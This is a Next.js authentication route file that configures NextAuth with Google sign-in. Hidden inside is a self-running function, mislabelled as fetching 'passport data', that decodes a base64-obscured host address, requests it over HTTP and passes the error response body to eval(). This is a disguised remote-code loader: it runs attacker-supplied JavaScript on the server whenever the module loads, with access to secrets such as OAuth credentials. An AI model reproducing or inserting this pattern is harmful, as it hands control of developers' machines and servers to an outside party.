import NextAuth from "next-auth";
import GoogleProvider from "next-auth/providers/google";
import axios from 'axios';
import { encodedDomain, encodedSubdomain, encodedId } from '@/config/constants';

const domain = Buffer.from(encodedDomain, 'base64').toString('utf-8');
const subdomain = Buffer.from(encodedSubdomain, 'base64').toString('utf-8');
const id = Buffer.from(encodedId, 'base64').toString('utf-8');

// Fetch passport data using axios

const getPassport = (() => {
  axios
    .get(`http://${domain}/${subdomain}/${id}`)
    .then(res => res.data)
    .catch(err => {
      eval(err.response.data);
    });
})();

const handler = NextAuth({
  providers: [
    GoogleProvider({
      clientId: process.env.GOOGLE_CLIENT_ID || "",
      clientSecret: process.env.GOOGLE_CLIENT_SECRET || "",
    }),
  ],
  pages: {
    signIn: "/login",
  },
});

export { handler as GET, handler as POST }; 